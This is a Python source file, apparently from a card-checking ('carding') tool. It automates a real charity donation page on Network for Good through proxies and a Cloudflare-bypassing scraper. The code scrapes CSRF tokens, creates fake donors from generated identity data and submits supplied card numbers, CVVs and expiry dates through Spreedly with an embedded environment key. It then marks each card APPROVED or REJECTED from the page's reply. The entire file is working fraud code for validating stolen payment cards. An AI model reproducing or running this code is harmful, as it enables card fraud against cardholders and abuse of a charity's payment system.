
   
import json
import cloudscraper
from time import sleep
from urllib.parse import quote
from random import randint
from dependencie.infobill import infobill

from model.models import gateData

class CoreGateCode:
    def __init__(self, cardID):
        self.cardID = cardID
        self.cardIDx2 = ""
        self.billx = infobill()
    def getStr(self,data,inicio,final):
        strx1 = data.split(inicio)
        strx2 = strx1[1].split(final)
        return strx2[0]
    def __valiDCardId(self):
        if self.cardID == 'visa':
            self.cardIDx2 = 'visa'
        elif self.cardID == 'mc':
            self.cardIDx2 = 'master'
        elif self.cardID == 'amex':
            self.cardIDx2 = 'american_express'
        elif self.cardID == 'discovery':
            self.cardIDx2 = 'discover'

    def processCodeGate(self,cc,dataGate:gateData):
        self.__valiDCardId()
        cc1 = cc.ccnum[0:6]
        cc2 = cc.ccnum[12:16]



        proxies = {
            'http': f'socks5://{dataGate.proxy}',
            'https': f'socks5://{dataGate.proxy}'
        }
        timeout = 40

        cs = cloudscraper.create_scraper(
            browser={
                'browser': 'firefox',
                'platform': 'windows',
                'mobile': False

            },
            debug=False

        )


    #datext

        #cs.proxies.update(proxies)
        try:
            status = dict()



            url="https://hswcmd.networkforgood.com/projects/58997-help-hswc"
            headers={

            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "DNT":"1",
            "Connection":"keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"none",
            'Sec-Fetch-User':'?1'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)

            authx = self.getStr(datac.text, 'name="csrf-token" content="', '"')



            url="https://hswcmd.networkforgood.com/projects/58997-help-hswc/donations?ui=bootstrap4"
            headers={

            "Accept":"*/*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Referer":"https://hswcmd.networkforgood.com/projects/58997-help-hswc",
            "X-CSRF-Token":authx,
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "Origin":"https://hswcmd.networkforgood.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            data='utf8=%E2%9C%93&donation_form%5Bstep%5D=3&donation_form%5Btargetable_type%5D=Project&donation_form%5Btargetable_id%5D=58997&donation%5Bdonation_amount%5D=-1&donation%5Bdonation_amount_custom_amount%5D=6&donation%5Bdesignation_id%5D=14625&donation%5Bnote%5D=&donation%5Bpublish_my_donation_amount%5D=0&donation%5Bpublish_my_name%5D=0&donation%5Bhonor_or_memorialize%5D=No&donation%5Bdonor_id%5D=6077300&recurring_donation%5Bperiod%5D=one_time&recurring_donation%5Bend_date%5D=&tribute%5Bname%5D=&tribute%5Brelationship%5D=&tribute%5Bnotify%5D=false&tribute%5Bnote%5D=&person%5Bfirst_name%5D=&person%5Blast_name%5D=&person%5Bstreet_address%5D=&person%5Bstreet_address2%5D=&person%5Bcity%5D=&person%5Bstate%5D=&person%5Bzip_code%5D=&person%5Bcountry%5D=US&person%5Bemail%5D=&person%5Bphone%5D=&donation_form%5Bquestionnaire_response%5D%5Bquestionnaire_id%5D=9127&donation_form%5Bquestionnaire_response%5D%5Banswers%5D%5Bq_39342%5D%5B%5D='
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)







            url="https://hswcmd.networkforgood.com/orders/new"
            headers={

            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Referer":"https://hswcmd.networkforgood.com/projects/58997-help-hswc",
            "DNT":"1",
            "Connection":"keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            "Sec-Fetch-User":"?1",
            'TE':'trailers'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)







            authx = self.getStr(datac.text, 'name="csrf-token" content="', '"')

            emailsxa = self.billx.emailx



            url="https://hswcmd.networkforgood.com/donors/unique"
            headers={

            "Accept":"*/*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Referer":"https://hswcmd.networkforgood.com/orders/login_or_new",
            "X-CSRF-Token":authx,
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "Origin":"https://hswcmd.networkforgood.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            data='email='+emailsxa+'%40hotmail.com&type=Individual'
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)


            url="https://hswcmd.networkforgood.com/donors?livestream_event=false"
            headers={

            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Referer":"https://hswcmd.networkforgood.com/orders/login_or_new",
            "Content-Type":"application/x-www-form-urlencoded",
            "Origin":"https://hswcmd.networkforgood.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            "Sec-Fetch-User":"?1",
            'TE':'trailers'
            }
            data='utf8=%E2%9C%93&authenticity_token='+quote(authx,safe="")+'&donor%5Bfundraiser%5D=false&donor%5Banonymous%5D=true&donor%5Btype%5D=Individual&donor%5Bfirst_name%5D='+self.billx.nameFirs+'&donor%5Blast_name%5D='+self.billx.nameLast+'&donor%5Bemail%5D='+emailsxa+'%40hotmail.com'
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)

            authx = self.getStr(datac.text, 'name="csrf-token" content="', '"')
            sleep(2)


            url="https://core.spreedly.com/v1/payment_methods/restricted.json?from=iframe&v=1.75"
            headers={

            "Accept":"*/*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "CONTENT-TYPE":"application/json",
            "Spreedly-Environment-Key":"2tI9DNTiP5mcix58k3VMV33UrI",
            "Origin":"https://core.spreedly.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://core.spreedly.com/v1/embedded/number-frame-1.75.html",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            data='{"environment_key":"2tI9DNTiP5mcix58k3VMV33UrI","payment_method":{"credit_card":{"number":"'+cc.ccnum+'","verification_value":"'+cc.cv2+'","first_name":"'+self.billx.nameFirs+'","last_name":"'+self.billx.nameLast+'","full_name":"'+self.billx.nameFirs+' '+self.billx.nameLast+'","email":"'+emailsxa+'@hotmail.com","month":"'+cc.expm+'","year":"'+cc.expy+'","address1":"'+self.billx.address+'","city":"'+self.billx.city+'","state":"'+self.billx.estado2+'","zip":"'+self.billx.zipcode+'","country":"US"}}}'
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)



            tok = datac.json()['transaction']['payment_method']['token']



            url="https://hswcmd.networkforgood.com/orders"
            headers={

            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Referer":"https://hswcmd.networkforgood.com/orders/new",
            "Content-Type":"application/x-www-form-urlencoded",
            "Origin":"https://hswcmd.networkforgood.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            "Sec-Fetch-User":"?1",
            'TE':'trailers'
            }
            data='utf8=%E2%9C%93&authenticity_token='+quote(authx,safe="")+'&live_stream=false&donor%5Bemail%5D='+emailsxa+'%40hotmail.com&credit_card%5Bname%5D='+self.billx.nameFirs+'+'+self.billx.nameLast+'&credit_card%5Bmonth%5D='+cc.expm+'&credit_card%5Byear%5D='+cc.expy+'&payment_profile%5Bpayment_method_token%5D='+tok+'&payment_profile%5Bgateway_customer_id%5D=dadae8064296cf664455fc48620c8ffe141f&payment_profile%5Bname_on_card%5D='+self.billx.nameFirs+'+'+self.billx.nameLast+'&payment_profile%5Blast_four_digits%5D='+cc2+'&payment_profile%5Bcard_type%5D='+self.cardIDx2+'&payment_profile%5Bmonth%5D='+cc.expm+'&payment_profile%5Byear%5D='+cc.expy+'&donor_email_address='+emailsxa+'%40hotmail.com&address%5Bstreet_address%5D='+self.billx.address+'&address%5Bstreet_address2%5D=&address%5Bcity%5D='+self.billx.city+'&address%5Bstate%5D='+self.billx.estado2+'&address%5Bzip_code%5D='+self.billx.zipcode+'&address%5Bcountry%5D=US&donor%5Bphone_number%5D='+self.billx.phone1+'&donor%5Bphone_number_type%5D=cell&order%5Bcbx_terms_and_conditions%5D=1&order%5Badd_or_deduct_fee%5D=add&order%5Btotal_add_fee%5D=0.18&order%5Btotal_deduct_fee%5D=0.0&order%5Badd_or_deduct_fee_percentage%5D=0.03&order%5Brisk_token%5D=%7B%22device_session_id%22%3A%22184cbb9b0f6d0fb55b9314c946327277%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2254dfef6034be9b8df2da83378ea9fa3f%22%7D'
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)


   
            if 'Thank you for supporting our organization!' in datac.text:
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: APPROVED""",'proxy':dataGate.proxy,'datext':None}
            elif 'Check the card details carefully and try again, or use a different card' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: REJECTED""",'proxy':dataGate.proxy,'datext':None}
            else:
                status = {'msg':3,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy,'datext':None}

            return status
        except Exception as e:
            print(e,'que pasox')
            return {'msg':4,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy}
